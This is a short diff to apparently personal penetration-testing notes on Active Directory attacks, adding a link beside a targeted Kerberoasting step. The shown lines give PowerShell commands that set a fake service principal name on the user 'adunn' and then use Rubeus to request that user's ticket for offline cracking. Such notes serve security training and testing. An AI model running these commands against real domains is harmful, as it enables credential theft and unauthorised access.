@@ -108,7 +108,7 @@ create the fake SPN for `adunn` user
 Set-DomainObject -Credential $Cred -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
 ```
 
-use `Rubeus` to catch the ticket 
+use `Rubeus` to catch the ticket also check this [kerberoasting](https://github.com/kiro6/penetration-testing-notes/blob/main/Penetration%20Testing/Kerberos%20attacks/README.md#kerberoasting)
 ```powershell
 .\Rubeus.exe kerberoast /user:adunn /nowrap
 ```
